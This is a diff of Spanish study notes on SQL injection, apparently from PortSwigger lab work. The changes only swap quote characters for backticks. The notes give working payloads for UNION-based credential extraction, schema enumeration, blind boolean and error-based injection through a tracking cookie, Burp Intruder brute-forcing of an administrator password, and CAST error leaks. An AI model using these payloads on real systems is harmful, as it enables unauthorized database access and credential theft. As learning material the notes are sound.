@@ -137,19 +137,19 @@ La informacion interesante usualmente esta en forma de string. Esto significa qu
 Si el tipo de dato de la columna no es compatible con string, el query causara un error en la base de datos, que una vez mas podra ser o no visible en la respuesta http. Esto sirve como para explorar la BD.
 
 #Punto de inyeccion: el punto en la consulta sql al que podemos inyectarle mierda  
-Se puede hacer ´' UNION SELECT username, pass FROM users--´ por ejemplo
+Se puede hacer `' UNION SELECT username, pass FROM users--` por ejemplo
 
 #### Concatenar varias columnas en una sola
 A veces la consulta SQL del servidor devuelve una cantidad menor de columnas de las que queremos extraer. Para esto, podemos concatenar varios valores de columnas en una sola.  
 Por ejemplo, en Oracle se hace asi:  
-´' UNION SELECT username || '~' || password FROM users--´  
+`' UNION SELECT username || '~' || password FROM users--`  
 El || concatena y el ~ en este caso simplemente separa, pero podria ser cualquier otro simbolo.  
 Una vez más, en el [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) se puede encontrar la sintaxis de cada DB.
 
 ##### Ejemplo
 Hay una consulta que da dos campos, un codigo int y un string. Para obtener los resultados puedo usar  
-´' UNION SELECT 1,username || '~' || password FROM users--´  
-El 1 es para que quede ese valor en la primera columna, ya que el esquema del union select tiene que ser compatible con el select original. Los espacios en realidad serían +, en todas las inyecciones (´'+UNION+SELECT+1,username+...´)
+`' UNION SELECT 1,username || '~' || password FROM users--`  
+El 1 es para que quede ese valor en la primera columna, ya que el esquema del union select tiene que ser compatible con el select original. Los espacios en realidad serían +, en todas las inyecciones (`'+UNION+SELECT+1,username+...`)
 
 #### Examinando la base de datos
 Para explotar vulnerabilidades SQL se necesita conocer el tipo y version de la base asi como las tablas y columnas que contiene esta base.
@@ -161,28 +161,28 @@ Para explotar vulnerabilidades SQL se necesita conocer el tipo y version de la b
 | PostgreSQL       | `SELECT version()`       |  
 
 Podria usarse por ejemplo con un UNION. El @@version aparentemente muestra version del so?  
-La mayoria de bases de datos (excepto Oracle) tiene un conjunto de vistas llamado esquema de informacion, que provee informacion de la base de datos, por ejemplo, podria usarse la consulta ´SELECT TABLE_NAME,NULL,... FROM information_schema.tables´ para obtener las tablas de la base.  
-Luego, usando ´SELECT COLUMN_NAME,DATA_TYPE,NULL,... FROM information_schema.columns WHERE table_name = 'Users'´ podriamos obtener el esquema de la tabla Users.
-Luego ya teniendo las columnas de users podriamos hacer ´SELECT username, pass,NULL,... FROM Users´
+La mayoria de bases de datos (excepto Oracle) tiene un conjunto de vistas llamado esquema de informacion, que provee informacion de la base de datos, por ejemplo, podria usarse la consulta `SELECT TABLE_NAME,NULL,... FROM information_schema.tables` para obtener las tablas de la base.  
+Luego, usando `SELECT COLUMN_NAME,DATA_TYPE,NULL,... FROM information_schema.columns WHERE table_name = 'Users'` podriamos obtener el esquema de la tabla Users.
+Luego ya teniendo las columnas de users podriamos hacer `SELECT username, pass,NULL,... FROM Users`
 information_schema.tables: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
 information_schema.columns: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
 
 ### Inyección SQL ciega (blind)
 Ocurre cuando una aplicacion es vulnerable a una inyeccion SQL pero sus respuestas HTTP no contienen el resultado de la consulta SQL relevante o detalles sobre un error en la base de datos.  
-Muchas tecnicas, como la de ´UNION´ no son efectivos con inyecciones SQL ciegas, ya que su éxito depende completamente de poder ver los resultados de la consulta inyectada en las respuestas de la aplicacion. Sin embargo aún es posible explotar las inyecciones ciegas para obtener acceso no autorizado, pero debemos usar técnicas distintas.
+Muchas tecnicas, como la de `UNION` no son efectivos con inyecciones SQL ciegas, ya que su éxito depende completamente de poder ver los resultados de la consulta inyectada en las respuestas de la aplicacion. Sin embargo aún es posible explotar las inyecciones ciegas para obtener acceso no autorizado, pero debemos usar técnicas distintas.
 
 #### Ejemplo de inyección SQL ciega con cookies
-Una pagina tiene una cookie de tracking: ´Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4´ para la cual la aplicación usa una consulta SQL para determinar si es un usuario conocido:  
-´SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'´  
+Una pagina tiene una cookie de tracking: `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4` para la cual la aplicación usa una consulta SQL para determinar si es un usuario conocido:  
+`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`  
 Esta consulta es vulnerable a una inyección SQL pero los resultados no son devueltos al usuario. Sin embargo la aplicación se comporta distinto dependiendo en si la consulta devuelve algún dato o no; si se sube un id reconocido, el query devuelve datos y se recibe el mensaje "Welcome back" en la respuesta.  
 Este comportamiento es suficiente para explotar la vulnerabilidad, ya que podemos obtener informacion al desencadenar diferentes respuestas condicionalmente, dependiendo de  una condicion inyectada.
-Le agregamos a la cookie ´' AND '1'='1´ o ´' AND '1'='2´ y en el primer caso da true y en el segundo caso no. Entonces podemos jugar con eso por ejemplo para intentar adivinar la contraseña del Administrador:  
-´' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't´
+Le agregamos a la cookie `' AND '1'='1` o `' AND '1'='2` y en el primer caso da true y en el segundo caso no. Entonces podemos jugar con eso por ejemplo para intentar adivinar la contraseña del Administrador:  
+`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
 En caso de que no aparezca el mensaje "Welcome back", se estaría indicando que la condicion es falsa, osea que el primer caracter de la contraseña es menor a t.  
-´' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's´  
+`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`  
 En caso de que esta última consulta diera true, podriamos estar seguros de que la primer letra de la contraseña del administrador es s. Podriamos seguir este proceso hasta obtener la contraseña del administrador.
 #SUUBSTRING a veces se llama SUBSTR dependiendo de la base de datos. El primer 1 es la posicion el segundo el largo del substring.
-Ejemplo: ´Cookie: TrackingId=xK4RIo0XAv9wnTGy' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'), 1, 4) > 'b73a;´  
+Ejemplo: `Cookie: TrackingId=xK4RIo0XAv9wnTGy' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'), 1, 4) > 'b73a;`  
 En este caso los dos primeros caracteres son b8, con lo cual b7 dara true, b8 dara false. Se va fijando para cada caracter como si fueran numeros. Ademas, tener en cuenta que ''a'>'0'  
 Si ponemos largo 26 pero el campo tiene 15 caracteres, solo tomara los 15 caracteres.
 
@@ -195,13 +195,13 @@ Se refiere a los casos cuando puede usarse un mensaje de error para obtener o in
 Algunas aplicaciones ejecutan queries SQL pero su comportamiento no cambia independientemente de si la query devuelve o no información. En este caso la técnica no funcionará porque inyectar condiciones booleanas no le hace diferencia a la aplicación.  
 Sin embargo a veces es posible inducirla a devolver respuestas diferentes dependiendo de si ocurre un error. La query puede modificarse para que cause un error en la BD si y sólo si la condición es true. Usualmente un error no manejado lanzado por la base causa alguna diferencia en la respuesta de la aplicación, como un mensaje de error. Esto nos permite inferir si la condición inyectada era cierta o no.  
 Para ver cómo funciona eto, supongamos que se envian dos request en el cookie:  
-´xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a´  
-´xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a´  
-Esto usa ´CASE´ para testear una condición y devuelve una expresión diferente dependiendo de si la expresión es true:
+`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`  
+`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`  
+Esto usa `CASE` para testear una condición y devuelve una expresión diferente dependiendo de si la expresión es true:
 - En el primer caso, devuelve 'a' lo que no causa ningun error.
 - En el segundo caso evalua 1/0, lo que causa un error al dividir por 0.
 Si el error causa una diferencia en la respuesta HTTP podemos usar esto para determinar si la condición inyectada es verdadera. Haciendo esto podemos obtener la información como en el caso anterior, un caracter por vez:
-´xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a´
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
 #Hay formas diferentes de desencadenar errores condicionales y cada técnica funciona mejor o peor dependiendo del tipo de base de datos. Para más detalles, revisar la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 Podemos en el TrackingId primero agregar un ' para ver si devuelve error de sintaxis. El error deberia desaparecer si ponemos '' (`TrackingId=WbS9PRMYS9vtBMXH''`). Esto sugiere que un error de sintaxis es detectable.  
 Luego para confirmar que el servidor esta interpretando la inyeccion como una query SQL podemos usar un subquery usando sintaxis SQL valida como puede ser `TrackingId=xyz'||(SELECT '')||'`. Sin embargo esto podria dar error dependiendo del tipo de base de datos. En el caso de Oracle por ejemplo podemos intentarlo con algo que sabemos que funciona: `TrackingId=xyz'||(SELECT '' FROM dual)||'`. Despues de esto para confirmar que devuelve un error podemos simplemente probar con algo que no funcionara, como usando una tabla que no exista: `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`. Si ahora si se devuelve un error esto sugiere fuertemente que la inyeccion se esta procesando como una query SQL en el back-end.
@@ -217,23 +217,23 @@ Mientras el largo sea mayor al numero, dara true, en cuyo caso hara el 1/0 y por
 
 Aunque puede hacerse manualmente, a veces son campos muy largos, con lo cual en lugar del Burp Repeater es mejor usar el Burp Intruder.  
 `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
-Para poner un payload en el caracter `a` lo seleccionamos y clickeamos en Add §. Para probar un caracter en cada posicion, necesitamos tener payloads adecuados en la posicion. Vamos a la pestaña Payloads y chequeamos "Simple list", y en Payload settings agregamos los del rango ´a-z´ y ´0-9´  
+Para poner un payload en el caracter `a` lo seleccionamos y clickeamos en Add §. Para probar un caracter en cada posicion, necesitamos tener payloads adecuados en la posicion. Vamos a la pestaña Payloads y chequeamos "Simple list", y en Payload settings agregamos los del rango `a-z` y `0-9`  
 Simplemente vamos ejecutando el ataque en paralelo cada uno cambiando el numero en el SUBSTR y obtenemos los que dan codigo 500.  
 
 #### Extrayendo información sensible mediante mensajes de error SQL verbosos
-Una configuración precaria de la base de datos a veces lleva a mensajes de error verbosos, los cuales pueden proveer información útil a un atacante. Por ejemplo, consideremos el siguiente mensaje de error que ocurre al inyectar un ' en el parametro de ´id´:  
-´Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char´  
-Esto muestra el query completo de la aplicacion construido usando nuestro input. Podemos ver que en este caso estamos inyectando dentro de un string con '' en un bloque ´WHERE´. Esto facilita construir un query valido con un payload malicioso.  En este caso en particular, un -- al final deberia evitar el mensaje de error; esto para chequear que funciona como (no) deberia.
+Una configuración precaria de la base de datos a veces lleva a mensajes de error verbosos, los cuales pueden proveer información útil a un atacante. Por ejemplo, consideremos el siguiente mensaje de error que ocurre al inyectar un ' en el parametro de `id`:  
+`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  
+Esto muestra el query completo de la aplicacion construido usando nuestro input. Podemos ver que en este caso estamos inyectando dentro de un string con '' en un bloque `WHERE`. Esto facilita construir un query valido con un payload malicioso.  En este caso en particular, un -- al final deberia evitar el mensaje de error; esto para chequear que funciona como (no) deberia.
 A veces podemos inducir a la aplicacion a generar un mensaje de error que contenga datos que son devueltos por el query. Esto convierte una inyeccion SQL ciega en una completamente visible.  
-Podemos usar la funcion ´CAST()´ para lograr esto, lo que nos permite convertir un tipo de datos a otro. Por ejemplo, imaginemos que tenemos una query con lo siguiente:  
-´CAST((SELECT example_column FROM example_table) AS int)´  
-Usualmente la informacion que intentamos leer es un string. Intentar convertirlo en un tipo de datos incompatible como puede ser ´Int´ podria provocar un error como el siguiente:  
-´ERROR: invalid input syntax for type integer: "Example data"´  
+Podemos usar la funcion `CAST()` para lograr esto, lo que nos permite convertir un tipo de datos a otro. Por ejemplo, imaginemos que tenemos una query con lo siguiente:  
+`CAST((SELECT example_column FROM example_table) AS int)`  
+Usualmente la informacion que intentamos leer es un string. Intentar convertirlo en un tipo de datos incompatible como puede ser `Int` podria provocar un error como el siguiente:  
+`ERROR: invalid input syntax for type integer: "Example data"`  
 Este tipo de query puede ser util si un limite de caracteres nos impide desencadenar respuestas condicionales.  
-Ejemplo particular: ´xyz' AND CAST((SELECT 1) AS int)--´ o ´' AND 1=CAST((SELECT username FROM users) AS int)--´  
+Ejemplo particular: `xyz' AND CAST((SELECT 1) AS int)--` o `' AND 1=CAST((SELECT username FROM users) AS int)--`  
 A veces se dan errores por superara el limite de caracteres de la consulta. En esos casos debemos intentar achicarla. En ese caso podemos achicar incluso más la consulta, por ejemplo:  
-´TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--´  
-Esto podria dejarnos este mensaje de error: ´ERROR: invalid input syntax for type integer: "peter"´. Luego restaria hacer lo mismo con la pass y gg.
+`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
+Esto podria dejarnos este mensaje de error: `ERROR: invalid input syntax for type integer: "peter"`. Luego restaria hacer lo mismo con la pass y gg.
 
 
 ## John the Ripper
